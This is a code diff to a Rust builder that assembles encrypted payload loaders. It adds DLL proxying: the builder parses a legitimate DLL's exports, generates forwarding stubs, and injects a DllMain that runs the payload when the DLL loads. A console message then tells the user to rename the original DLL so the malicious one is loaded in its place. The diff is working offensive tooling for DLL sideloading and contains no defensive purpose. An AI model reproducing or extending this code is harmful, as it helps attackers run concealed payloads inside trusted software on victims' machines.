@@ -1,5 +1,7 @@
 use crate::aes::encrypt_aes;
 use crate::arg_parser::{Encryption, Execution, Format, Order};
+use crate::dll_proxy;
+use crate::pe_parser;
 use crate::sandbox::build_sandbox;
 use crate::tools::{random_aes_iv, random_aes_key, random_u8, EncryptionOutput};
 use crate::uuid_enc::encrypt_uuid;
@@ -141,13 +143,40 @@ fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, St
 fn apply_dll_format(
     replacements: &mut HashMap<&'static str, String>,
     main_rs_path: &Path,
+    is_proxy: bool,
 ) -> PathBuf {
     let dll_cargo_conf = r#"
     [lib]
     crate-type = ["cdylib"]"#;
     replacements.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());
 
-    let dll_main_fn = r#"
+    let dll_main_fn = if is_proxy {
+        r#"
+    const DLL_PROCESS_ATTACH: u32 = 1;
+    const DLL_PROCESS_DETACH: u32 = 0;
+
+    #[no_mangle]
+    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
+    extern "system" fn DllMain(
+        dll_module: usize,
+        call_reason: u32,
+        _: *mut ())
+        -> bool
+    {
+        match call_reason {
+            DLL_PROCESS_ATTACH => {
+                unsafe { proxy::init(); }
+                main();
+            }
+            DLL_PROCESS_DETACH => (),
+            _ => ()
+        }
+
+        true
+    }
+    "#
+    } else {
+        r#"
     const DLL_PROCESS_ATTACH: u32 = 1;
     const DLL_PROCESS_DETACH: u32 = 0;
 
@@ -183,7 +212,8 @@ fn apply_dll_format(
     pub extern "C" fn Run() {{
         main()
     }}
-    "#;
+    "#
+    };
     replacements.insert("{{DLL_MAIN}}", dll_main_fn.to_string());
 
     let lib_rs_path = main_rs_path.with_file_name("lib.rs");
@@ -208,6 +238,51 @@ fn apply_replacements(
     }
 }
 
+fn apply_proxy(order: &Order, folder: &Path) {
+    let proxy_path = order.proxy_dll.as_ref().unwrap();
+    let exports = pe_parser::parse_exports(proxy_path).unwrap_or_else(|e| {
+        eprintln!("[-] Failed to parse proxy DLL exports: {}", e);
+        exit(1);
+    });
+
+    if exports.is_empty() {
+        eprintln!("[-] Warning: proxy DLL has no exports");
+    }
+
+    let stem = pe_parser::dll_stem(proxy_path);
+    let proxy_output = dll_proxy::generate_proxy(&exports, &stem);
+
+    let src_dir = folder.join("src");
+    fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source)
+        .expect("Failed to write proxy.rs");
+
+    let lib_rs_path = src_dir.join("lib.rs");
+    let existing = fs::read_to_string(&lib_rs_path).expect("Failed to read lib.rs");
+
+    // Insert `mod proxy;` after inner attributes (#![...]) to avoid breaking them
+    let mut inner_attr_end = 0;
+    for line in existing.lines() {
+        let trimmed = line.trim();
+        if trimmed.starts_with("#!") || trimmed.is_empty() {
+            inner_attr_end += line.len() + 1; // +1 for newline
+        } else {
+            break;
+        }
+    }
+    let updated = format!(
+        "{}\n#[allow(non_upper_case_globals, non_snake_case)]\nmod proxy;\n{}",
+        &existing[..inner_attr_end.min(existing.len())].trim_end(),
+        &existing[inner_attr_end.min(existing.len())..]
+    );
+    fs::write(&lib_rs_path, updated).expect("Failed to update lib.rs with mod proxy");
+
+    println!(
+        "[+] DLL proxying: {} exports forwarded. Rename the original DLL to '{}'",
+        exports.len(),
+        proxy_output.original_dll_name
+    );
+}
+
 pub fn assemble(order: Order) -> PathBuf {
     println!("[+] Assembling Rust code..");
 
@@ -222,12 +297,17 @@ pub fn assemble(order: Order) -> PathBuf {
 
     let mut replacements = build_replacements(&order, &src_dir);
 
+    let is_proxy = order.proxy_dll.is_some();
     let target_file = match order.format {
-        Format::Dll => apply_dll_format(&mut replacements, &main_rs),
+        Format::Dll => apply_dll_format(&mut replacements, &main_rs, is_proxy),
         Format::Exe => main_rs,
     };
 
     apply_replacements(&replacements, &target_file, &cargo_toml);
+
+    if is_proxy {
+        apply_proxy(&order, &folder);
+    }
 
     println!("[+] Done assembling Rust code!");
     folder
